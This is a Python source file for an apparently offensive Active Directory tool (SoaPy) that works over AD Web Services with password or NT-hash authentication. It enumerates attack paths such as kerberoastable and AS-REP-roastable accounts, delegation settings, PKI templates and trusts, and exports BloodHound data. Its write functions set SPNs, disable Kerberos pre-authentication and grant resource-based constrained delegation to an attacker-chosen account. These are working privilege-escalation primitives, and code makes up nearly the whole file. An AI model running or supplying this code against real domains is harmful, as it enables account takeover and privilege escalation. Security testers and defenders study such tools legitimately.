import argparse
import logging
import sys
import json
from base64 import b64encode
# from uuid import UUID # Déjà dans cache_gen

from .cache_gen import (
    pull_all_ad_objects,
    SOAPHOUND_LDAP_PROPERTIES,
    process_bloodhound_data,
    create_and_combine_soaphound_cache
)

from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE, ACCESS_MASK, ACE, ACL, LDAP_SID, SR_SECURITY_DESCRIPTOR,
)
from src.adws import ADWSConnect, NTLMAuth
from src.soap_templates import NAMESPACES


# --- Fonctions Utilitaires pour les opérations d'écriture (inchangées) ---
# ... (fonctions _create_empty_sd, _create_allow_ace, getAccountDN, set_spn, set_asrep, set_rbcd) ...
def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR(); sd["Revision"] = b"\x01"; sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772; sd["OwnerSid"] = LDAP_SID(); sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""; sd["Sacl"] = b""; acl = ACL(); acl["AclRevision"] = 4
    acl["Sbz1"] = 0; acl["Sbz2"] = 0; acl.aces = []; sd["Dacl"] = acl; return sd

def _create_allow_ace(sid: LDAP_SID): 
    nace = ACE(); nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE; nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE(); acedata["Mask"] = ACCESS_MASK(); acedata["Mask"]["Mask"] = 983551 
    acedata["Sid"] = sid.getData(); nace["Ace"] = acedata; return nace

def getAccountDN(target: str, username: str, ip: str, domain: str, auth: NTLMAuth):
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    pull_et = pull_client.pull(query=get_account_query, attributes=["distinguishedname"])
    dn = None
    for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES): 
        dn_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
        if dn_elem is not None and dn_elem.text is not None:
            dn = dn_elem.text
            break
    if dn is None: logging.critical(f"Unable to find DN for {target}"); sys.exit(1)
    return dn

def set_spn(target: str, value: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False):
    dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(object_ref=dn, operation="add" if not remove else "delete", attribute="addata:servicePrincipalName", data_type="string", value=value)
    print(f"[+] SPN {value} {'removed' if remove else 'written'} on {target}!")

def set_asrep(target: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False):
    dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    pull_et = pull_client.pull(query=f"(distinguishedName={dn})", attributes=["userAccountControl"]) 
    uac_val = None
    for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
        uac_elem = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
        if uac_elem is not None and uac_elem.text is not None:
            uac_val = int(uac_elem.text)
            break
    if uac_val is None: logging.critical(f"Unable to find UAC for {target}"); sys.exit(1)
    newUac = uac_val | 0x400000 if not remove else uac_val & ~0x400000
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(object_ref=dn, operation="replace", attribute="addata:userAccountControl", data_type="string", value=str(newUac))
    print(f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully on {target}!")

def set_rbcd(target: str, account: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False):
    from base64 import b64decode 
    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    attributes: list = ["samaccountname", "objectsid", "distinguishedname", "msds-allowedtoactonbehalfofotheridentity"]
    pull_et = pull_client.pull(query=get_accounts_queries, attributes=attributes)
    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn_val: str = ""
    account_sid_obj: LDAP_SID | None = None

    for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES): 
        sam_name_elem = item.find(".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES)
        sd_elem = item.find(".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value", namespaces=NAMESPACES)
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)

        sam_name = sam_name_elem.text if sam_name_elem is not None and sam_name_elem.text is not None else ""
        sid_b64 = sid_elem.text if sid_elem is not None and sid_elem.text is not None else ""
        sd_b64 = sd_elem.text if sd_elem is not None and sd_elem.text is not None else ""
        current_dn = distinguishedName_elem.text if distinguishedName_elem is not None and distinguishedName_elem.text is not None else ""

        if sam_name and sid_b64 and sam_name.casefold() == account.casefold():
            try: account_sid_obj = LDAP_SID(data=b64decode(sid_b64))
            except Exception as e: logging.error(f"Error decoding SID for attacker account {account}: {e}")
        
        if current_dn and sam_name and sam_name.casefold() == target.casefold():
            target_dn_val = current_dn
            if sd_b64:
                try: target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd_b64))
                except Exception as e: logging.error(f"Error decoding SD for target {target}: {e}")
    
    if not account_sid_obj: logging.critical(f"Unable to find/decode SID for {account}. Target DN found: {target_dn_val if target_dn_val else 'Not Found'}"); sys.exit(1)
    if not target_dn_val: logging.critical(f"Target {target} DN not found."); sys.exit(1)

    target_sd["Dacl"].aces = [ace for ace in target_sd["Dacl"].aces if ace["Ace"]["Sid"].formatCanonical() != account_sid_obj.formatCanonical()]
    if not remove: target_sd["Dacl"].aces.append(_create_allow_ace(account_sid_obj))
    
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    encoded_sd = b64encode(target_sd.getData()).decode("utf-8") 
    put_client.put(object_ref=target_dn_val, operation="replace", attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity", data_type="base64Binary", value=encoded_sd)
    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(object_ref=target_dn_val, operation="delete", attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity", data_type="base64Binary", value=encoded_sd)
    print(f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} on {target}!")
    print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")

def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝
███████║╚██████╔╝██║  ██║██║        ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ██║1.1
    """)

    parser = argparse.ArgumentParser(add_help=True, description="Enumerate/write LDAP via ADWS")
    parser.add_argument("connection", action="store", help="domain/user[:pass]@host", nargs='?')
    parser.add_argument("--debug", action="store_true", help="Enable DEBUG output")
    parser.add_argument("--ts", action="store_true", help="Add timestamp to logs")
    parser.add_argument("--hash", action="store", metavar="NTHASH", help="NT hash for auth")

    enum_group = parser.add_argument_group('Enumeration')
    enum_group.add_argument("--users", action="store_true", help="Enumerate users")
    enum_group.add_argument("--computers", action="store_true", help="Enumerate computers")
    enum_group.add_argument("--groups", action="store_true", help="Enumerate groups")
    enum_group.add_argument("--constrained", action="store_true", help="Enumerate msDS-AllowedToDelegateTo")
    enum_group.add_argument("--unconstrained", action="store_true", help="Enumerate TRUSTED_FOR_DELEGATION")
    enum_group.add_argument("--spns", action="store_true", help="Enumerate servicePrincipalName")
    enum_group.add_argument("--asreproastable", action="store_true", help="Enumerate DONT_REQ_PREAUTH")
    enum_group.add_argument("--admins", action="store_true", help="Enumerate adminCount=1")
    enum_group.add_argument("--rbcds", action="store_true", help="Enumerate msDS-AllowedToActOnBehalfOfOtherIdentity")
    enum_group.add_argument("-q", "--query", action="store", metavar="LDAP_QUERY", help="Raw LDAP query")
    enum_group.add_argument("--filter", action="store", metavar="ATTRS", help="Comma-separated attributes to select")
    
    bh_group = parser.add_argument_group('BloodHound & Cache')
    bh_group.add_argument("--bloodhound", action="store_true", help="Collect data and generate BloodHound JSON files")
    bh_group.add_argument("--cache", action="store_true", help="Create SOAPHound compatible cache files")
    bh_group.add_argument("--nolaps", action="store_true", help="Exclude LAPS attributes. Applies to --bloodhound and --cache collection.")

    writing_group = parser.add_argument_group('Writing')
    writing_group.add_argument("--rbcd", action="store", metavar="SOURCE_ACC", help="Write/remove RBCD")
    writing_group.add_argument("--spn", action="store", metavar="SPN_VALUE", help="Write SPN value")
    writing_group.add_argument("--asrep", action="store_true", help="Write DONT_REQ_PREAUTH flag")
    writing_group.add_argument("--account", action="store", metavar="TARGET_ACC", help="Target account for write operation")
    writing_group.add_argument("--remove", action="store_true", help="Remove attribute value")

    if len(sys.argv) == 1: parser.print_help(); sys.exit(1)
    options = parser.parse_args()

    if options.nolaps and not (options.bloodhound or options.cache):
        parser.error("--nolaps can only be used with --bloodhound or --cache.")
        sys.exit(1)

    log_level = logging.DEBUG if options.debug else logging.INFO
    log_format = '%(asctime)s %(levelname)s: %(message)s' if options.ts else '%(levelname)s: %(message)s'
    logging.basicConfig(level=log_level, format=log_format, stream=sys.stdout)
    
    domain = username = password = remoteName = auth = None
    queries = {
        "users": "(&(objectClass=user)(objectCategory=person))", "computers": "(objectClass=computer)",
        "groups": "(objectCategory=group)", "constrained": "(msds-allowedtodelegateto=*)", 
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(!(objectClass=computer))(servicePrincipalName=*))", 
        "asreproastable":"(userAccountControl:1.2.840.113556.1.4.803:=4194304)",
        "admins": "(adminCount=1)", "rbcds": "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
        "all_objects": "(objectClass=*)",
        "pki_cas": "(|(objectClass=certificationAuthority)(objectClass=pKIEnrollmentService))",
        "pki_templates": "(objectClass=pKICertificateTemplate)",
        "trusts": "(objectClass=trustedDomain)",
    }

    requires_adws_connection = any([
        options.rbcd, options.spn, options.asrep, options.cache, options.bloodhound,
        options.users, options.computers, options.groups, options.constrained,
        options.unconstrained, options.spns, options.asreproastable,
        options.admins, options.rbcds, options.query
    ])

    if requires_adws_connection:
        if not options.connection: logging.critical("Connection string required."); sys.exit(1)
        try: domain, username, password, remoteName = parse_target(options.connection)
        except Exception as e: logging.critical(f"Invalid connection string: {e}"); sys.exit(1)
        if not domain: logging.critical('"domain" missing'); sys.exit(1)
        if not username: logging.critical('"username" missing'); sys.exit(1)
        if not password and not options.hash:
            from getpass import getpass
            password = getpass("Password:")
        auth = NTLMAuth(password=password, hashes=options.hash)

    if options.rbcd or options.spn or options.asrep:
        if not auth: logging.critical("Authentication required for write operations."); sys.exit(1)
        if not options.account: logging.critical("Target --account is required for write operations."); sys.exit(1)
        if options.rbcd:
            set_rbcd(ip=remoteName, domain=domain, target=options.account, account=options.rbcd, username=username, auth=auth, remove=options.remove)
        elif options.spn:
            set_spn(ip=remoteName, domain=domain, target=options.account, value=options.spn, username=username, auth=auth, remove=options.remove)
        elif options.asrep:
            set_asrep(ip=remoteName, domain=domain, target=options.account, username=username, auth=auth, remove=options.remove)
    
    elif options.bloodhound or options.cache:
        if not auth: logging.critical("Authentication required for data collection."); sys.exit(1)
        
        attributes_to_collect = list(SOAPHOUND_LDAP_PROPERTIES)
        if options.nolaps:
            if "ms-MCS-AdmPwdExpirationTime" in attributes_to_collect:
                attributes_to_collect.remove("ms-MCS-AdmPwdExpirationTime")
                logging.info("LAPS attribute collection disabled.")

        all_collected_items_accumulator = []
        main_domain_root_dn = "DC=" + ",DC=".join(domain.split('.')) # DN racine du domaine principal
        config_naming_context = f"CN=Configuration,{main_domain_root_dn}"

        # 1. Collecte des objets standards du domaine
        logging.info(f"Collecting standard domain objects from: {main_domain_root_dn}")
        std_data_container = pull_all_ad_objects(
            ip=remoteName, domain=domain, username=username, auth=auth,
            query=queries["all_objects"], attributes=attributes_to_collect,
            base_dn_override=main_domain_root_dn # Expliciter le base DN
        )
        if std_data_container and std_data_container.get("objects"):
            all_collected_items_accumulator.extend(std_data_container["objects"])
        else:
            logging.warning("No standard domain objects collected or collection failed.")

        # 2. Collecte PKI CAs
        logging.info(f"Collecting PKI CAs from: {config_naming_context}")
        # Important: ADWSConnect doit pouvoir cibler une autre base que self._domain
        # Pour cela, il faudrait adapter ADWSConnect.pull ou sa méthode _query_enumeration
        # pour accepter un base_dn, ou créer une instance ADWSConnect spécifique pour la config.
        # Supposons pour l'instant que votre pull_all_ad_objects peut le gérer (même si l'implémentation actuelle ne le fait pas directement)
        # ou que la recherche ADWS est assez large par défaut (peu probable pour CN=Configuration sans ciblage).
        pki_cas_container = pull_all_ad_objects(
            ip=remoteName, domain=domain, username=username, auth=auth, # L'auth est toujours pour le domaine principal
            query=queries["pki_cas"], attributes=attributes_to_collect,
            base_dn_override=config_naming_context 
        )
        if pki_cas_container and pki_cas_container.get("objects"):
            all_collected_items_accumulator.extend(pki_cas_container["objects"])
        else:
            logging.warning("No PKI CA objects collected or collection failed.")

        # 3. Collecte PKI Templates
        logging.info(f"Collecting PKI Templates from: {config_naming_context}")
        pki_templates_container = pull_all_ad_objects(
            ip=remoteName, domain=domain, username=username, auth=auth,
            query=queries["pki_templates"], attributes=attributes_to_collect,
            base_dn_override=config_naming_context
        )
        if pki_templates_container and pki_templates_container.get("objects"):
            all_collected_items_accumulator.extend(pki_templates_container["objects"])
        else:
            logging.warning("No PKI Template objects collected or collection failed.")

        # 4. Collecte Trusts
        logging.info(f"Collecting Trusts from: {main_domain_root_dn}")
        trusts_attributes = ["trustAttributes", "trustDirection", "name", "flatName", "securityIdentifier", "objectClass", "distinguishedName", "cn", "whenChanged", "whenCreated"] # Attributs pour les trusts
        trusts_container = pull_all_ad_objects(
            ip=remoteName, domain=domain, username=username, auth=auth,
            query=queries["trusts"], attributes=trusts_attributes, # Utiliser une liste d'attributs spécifique
            base_dn_override=main_domain_root_dn # Les trusts sont généralement des objets sous le domaine
        )
        if trusts_container and trusts_container.get("objects"):
            all_collected_items_accumulator.extend(trusts_container["objects"])
        else:
            logging.warning("No Trust objects collected or collection failed.")

        if not all_collected_items_accumulator:
            logging.error("No data collected from ADWS after all attempts. Exiting."); sys.exit(1)
        
        if options.bloodhound:
            logging.info(f"Processing {len(all_collected_items_accumulator)} total objects for BloodHound...")
            process_bloodhound_data(all_collected_items_accumulator, domain, main_domain_root_dn)
        
        if options.cache:
            logging.info(f"Processing {len(all_collected_items_accumulator)} total objects for SOAPHound cache...")
            create_and_combine_soaphound_cache(all_collected_items_accumulator, main_domain_root_dn, output_dir=".")

    # --- Énumération Standard ---
    elif any([options.users, options.computers, options.groups, options.constrained,
              options.unconstrained, options.spns, options.asreproastable,
              options.admins, options.rbcds, options.query]):
        # ... (logique d'énumération standard comme dans ma réponse précédente)
        if not auth: logging.critical("Authentication required for enumeration."); sys.exit(1)
        query_str = options.query
        if not query_str: 
            for flag, ldap_filter_str in queries.items():
                if getattr(options, flag, False) and flag not in ["all_objects", "pki_cas", "pki_templates", "trusts"]:
                    query_str = ldap_filter_str; break
        if not query_str: logging.critical("No query specified for enumeration."); sys.exit(1)
        attrs_list = options.filter.split(',') if options.filter else ["distinguishedName", "sAMAccountName"]
        
        logging.info(f"Querying: {query_str} Attributes: {attrs_list}")
        pull_client = ADWSConnect.pull_client(remoteName, domain, username, auth)
        try:
            # Pour l'énumération standard, on suppose que ADWSConnect.pull utilise le domain_root_dn par défaut
            pull_et = pull_client.pull(query=query_str, attributes=attrs_list)
            # ... (logique d'affichage des résultats comme avant) ...
            obj_count = 0
            for items_node in pull_et.findall(".//wsen:Items", namespaces=NAMESPACES):
                for item_elem in items_node.findall("./*", namespaces=NAMESPACES):
                    obj_count += 1; print(f"\n--- Object {obj_count} ({item_elem.tag.split('}')[-1]}) ---")
                    for attr_name_display in attrs_list:
                        values_display = []
                        for val_elem_display in item_elem.findall(f".//addata:{attr_name_display}/ad:value", namespaces=NAMESPACES):
                            if val_elem_display.text is not None: values_display.append(val_elem_display.text)
                        if values_display: print(f"  {attr_name_display}: {', '.join(values_display)}")
            logging.info(f"Enumeration found {obj_count} objects for query: {query_str}")
        except Exception as e:
            logging.critical(f"Enumeration error: {e}", exc_info=True)

    else:
        if not requires_adws_connection: parser.print_help()
        elif auth: logging.info("ADWS connection established but no specific task performed.")

if __name__ == "__main__":
    run_cli()